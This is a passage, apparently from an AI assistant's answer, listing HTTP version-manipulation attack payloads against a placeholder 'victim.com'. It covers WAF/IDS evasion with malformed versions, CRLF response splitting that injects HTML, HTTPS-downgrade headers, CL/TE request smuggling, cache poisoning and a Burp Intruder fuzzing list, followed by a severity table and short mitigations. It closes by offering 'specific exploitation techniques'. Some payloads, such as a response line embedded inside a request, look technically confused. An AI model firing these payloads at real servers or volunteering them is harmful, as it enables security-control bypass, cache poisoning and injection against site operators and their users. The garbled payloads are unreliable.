## 9. WAF/IDS Evasion via Version Manipulation

### Invalid versions bypass
```
GET /admin HTTP/2.5
Host: victim.com
```
```
GET /admin HTTP/1.1.0
Host: victim.com
```
```
GET /admin HTTP/1.1
Host: victim.com
HTTP/1.1 200 OK
```

### Version in path
```
GET /HTTP/1.1/admin HTTP/1.1
Host: victim.com
```
```
GET /admin?version=HTTP/1.1 HTTP/1.1
Host: victim.com
```

### Whitespace confusion
```
GET  /admin HTTP/1.1
Host: victim.com
```
```
GET	/admin HTTP/1.1
Host: victim.com
```
```
GET /admin	HTTP/1.1
Host: victim.com
```

---

## 10. Response Version Manipulation

### Forcing HTTP/0.9 response
```
GET /admin HTTP/0.9
```
(Server may return raw response without headers)

### Version mismatch attacks
```
GET /admin HTTP/1.1
Host: victim.com

HTTP/1.0 200 OK
Content-Length: 0

[body from another request]
```

### Response splitting via version
```
GET /redirect?url=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2020%0d%0a%0d%0a<html>Hacked!</html> HTTP/1.1
Host: victim.com
```

---

## 11. Protocol Confusion Attacks

### HTTPS downgrade to HTTP
```
GET http://victim.com/admin HTTP/1.1
Host: victim.com
```
(Stripping HTTPS)

### Mixed protocol headers
```
GET /admin HTTP/1.1
Host: victim.com
X-Forwarded-Proto: http
```
(Force HTTP interpretation)

### Scheme manipulation
```
GET /admin HTTP/1.1
Host: victim.com
X-Forwarded-Scheme: http
X-Forwarded-Ssl: off
Front-End-Https: off
```

---

## 12. Chunked Encoding with Version Confusion

### HTTP/1.1 chunked with HTTP/1.0 backend
```
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
Content-Length: 100

5
hello
0

```
(Backend may read Content-Length instead)

### TE version confusion
```
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
Content-Length: 4
HTTP/1.0 200 OK

0

GET /admin
```

---

## 13. Version-Based Cache Poisoning

### Cache key with version
```
GET / HTTP/1.1
Host: victim.com
```
vs
```
GET / HTTP/1.0
Host: victim.com
```
(Different cache keys - may poison wrong version)

### Vary header abuse
```
GET / HTTP/1.1
Host: victim.com
Accept: text/html
Vary: Accept-Encoding, HTTP-Version
```

---

## 14. Tool-Based Version Fuzzing Payloads

### Burp Intruder payload list
```
HTTP/0.9
HTTP/1.0
HTTP/1.1
HTTP/1.2
HTTP/1.3
HTTP/1.5
HTTP/2.0
HTTP/2
HTTP/3.0
HTTP/3
HTTP/1.1a
HTTP/1.1.1
HTTP/1.1-dev
HTTP/1.1-test
HTTP/1.1 
HTTP/1.1\t
HTTP/1.1\x00
HTTP/1.1\x0a
HTTP/1.1\x0d
HTTP/1.1\x20
HTTP/1.1.0
HTTP/1.1.0.0
HTTP/1.1beta
HTTP/1.1rc1
```

---

## Attack Impact Summary

| Attack Type | Impact | Severity |
|-------------|--------|----------|
| HTTP/0.9 smuggling | Response confusion, XSS | High |
| Version downgrade | WAF bypass, security control bypass | High |
| HTTP/2 smuggling | Request smuggling via ALPN | Critical |
| Proxy confusion | Cache poisoning, request hijacking | Critical |
| Version fuzzing | DoS, unexpected behavior | Medium |
| Response splitting | Cache poisoning, XSS | High |
| Protocol downgrade | SSL stripping, MITM | Critical |
| Version-based cache poison | Malicious cache serving | High |

---

## Mitigation Recommendations

1. **Strict version validation** – Reject invalid HTTP versions
2. **Consistent version handling** – Normalize across proxies/backends
3. **HTTP/2 and HTTP/3 security** – Implement proper ALPN validation
4. **Version downgrade protection** – Reject downgrade attempts when possible
5. **Logging** – Log all version manipulation attempts
6. **WAF rules** – Detect and block malformed HTTP versions

---

If you need **specific exploitation techniques**, **detection rules**, or **mitigation implementations** for any of these version manipulation attacks, let me know!
